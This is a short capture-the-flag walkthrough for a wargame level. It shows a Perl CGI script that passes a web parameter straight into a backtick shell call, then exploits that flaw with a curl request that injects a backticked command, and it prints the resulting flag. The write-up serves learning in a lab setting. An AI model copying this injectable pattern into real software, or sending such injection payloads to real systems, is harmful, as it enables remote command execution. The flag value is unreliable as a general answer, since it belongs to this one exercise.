1. We are given Perl script `level04.pl`, that contains
``` Perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
2. `localhost:4747` line and [description](https://www.internet-technologies.ru/articles/cgi-na-perl-pervye-shagi.html) of CGI scripts in internet hints that this script is working with `Get` web requests on port 4747.
3. For sending requests on port, [`curl` command](https://zen.yandex.ru/media/mcs/10-komand-curl-kotorye-vam-sleduet-znat-5f8de17ab5e4d5370ed5e9d9) will be good
4. Request will look like this (script receives 1 input parameter - x)
``` Bash
curl localhost:4747/level04.pl?x="any text"
```
5. As an output we get the same input parameter that was passed, and script using echo to print it. `echo` can execute commands if they passed in backticks: \` \`. So let's exploit it!
6. Pass `getflag` as parameter with protected backticks
``` Bash
curl -v localhost:4747/level04.pl?x=\`getflag\`
```
7. Execution of request results to level05 flag: **ne2searoevaevoem4ov4ar8ap**
